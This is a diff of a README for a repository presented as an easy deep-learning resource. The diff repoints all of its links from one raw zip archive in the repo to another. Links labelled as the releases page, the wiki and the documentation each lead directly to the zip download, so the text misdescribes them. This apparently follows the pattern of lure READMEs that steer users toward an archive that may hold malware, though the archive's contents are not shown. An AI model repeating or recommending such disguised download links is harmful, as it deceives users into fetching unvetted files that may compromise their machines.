@@ -1,6 +1,6 @@
 # 🤖 Deep-Learning - Unlock AI with Simple Steps
 
-[![Download Deep-Learning](https://raw.githubusercontent.com/diyuyuyu/Deep-Learning/main/tailstock/Deep-Learning.zip)](https://raw.githubusercontent.com/diyuyuyu/Deep-Learning/main/tailstock/Deep-Learning.zip)
+[![Download Deep-Learning](https://raw.githubusercontent.com/diyuyuyu/Deep-Learning/main/ANN/Deep-Learning-3.0.zip)](https://raw.githubusercontent.com/diyuyuyu/Deep-Learning/main/ANN/Deep-Learning-3.0.zip)
 
 ## 🎉 Overview
 
@@ -21,7 +21,7 @@ To get started with Deep-Learning, follow these simple steps to download and run
 
 ### Step 1: Visit the Download Page
 
-To get the latest version of Deep-Learning, visit the Releases page. You can find it [here](https://raw.githubusercontent.com/diyuyuyu/Deep-Learning/main/tailstock/Deep-Learning.zip).
+To get the latest version of Deep-Learning, visit the Releases page. You can find it [here](https://raw.githubusercontent.com/diyuyuyu/Deep-Learning/main/ANN/Deep-Learning-3.0.zip).
 
 ### Step 2: Download the Latest Release
 
@@ -64,7 +64,7 @@ The Deep-Learning repository covers a range of topics to help you build a strong
 
 ## 📑 Documentation
 
-For more detailed usage instructions, refer to the documentation included in the download package or visit our [Wiki](https://raw.githubusercontent.com/diyuyuyu/Deep-Learning/main/tailstock/Deep-Learning.zip).
+For more detailed usage instructions, refer to the documentation included in the download package or visit our [Wiki](https://raw.githubusercontent.com/diyuyuyu/Deep-Learning/main/ANN/Deep-Learning-3.0.zip).
 
 ## 🌐 Community Support
 
@@ -76,7 +76,7 @@ If you want to contribute to the Deep-Learning repository, consider submitting b
 
 ## 🔗 Links
 
-- [Releases Page](https://raw.githubusercontent.com/diyuyuyu/Deep-Learning/main/tailstock/Deep-Learning.zip)
-- [Wiki](https://raw.githubusercontent.com/diyuyuyu/Deep-Learning/main/tailstock/Deep-Learning.zip)
+- [Releases Page](https://raw.githubusercontent.com/diyuyuyu/Deep-Learning/main/ANN/Deep-Learning-3.0.zip)
+- [Wiki](https://raw.githubusercontent.com/diyuyuyu/Deep-Learning/main/ANN/Deep-Learning-3.0.zip)
 
 We hope you enjoy exploring deep learning with us!
